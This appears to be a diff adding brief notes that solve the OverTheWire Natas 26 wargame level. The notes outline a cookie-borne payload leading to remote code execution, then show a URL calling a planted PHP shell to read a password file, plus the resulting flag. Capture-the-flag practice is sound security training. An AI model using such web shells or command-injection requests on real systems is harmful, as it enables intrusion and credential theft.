@@ -1,0 +1,8 @@
+=> use makeload.php to create payload
+=> then set cookie with the payload
+=> send the request
+=> RCE
+
+http://natas26.natas.labs.overthewire.org/img/qwert.php?par=cat%20/etc/natas_webpass/natas27
+
+55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ 
